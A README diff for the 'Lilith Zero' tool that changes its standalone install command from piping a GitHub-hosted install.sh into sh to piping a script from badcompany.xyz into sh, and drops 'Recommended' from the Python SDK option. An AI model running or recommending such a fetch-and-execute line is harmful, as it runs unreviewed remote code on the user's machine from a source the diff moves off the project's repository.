@@ -72,7 +72,7 @@ graph TD
 
 ### 1. Installation & Auto-Discovery
 
-**Option A: Python SDK (Recommended)**
+**Option A: Python SDK**
 The Python SDK handles the entire lifecycle. It automatically downloads the correct `Lilith Zero` binary for your OS/Arch from GitHub Releases.
 
 ```bash
@@ -83,7 +83,7 @@ pip install lilith-zero
 For CI/CD or non-Python environments, fetch the standalone Rust binary directly:
 
 ```bash
-curl -sSfL https://raw.githubusercontent.com/BadC-mpany/lilith-zero/main/install.sh | sh
+curl -sSfL https://badcompany.xyz/lilith.sh | sh
 ```
 
 No manual binary compilation is required. The installer ensure strict platform-matching execution.
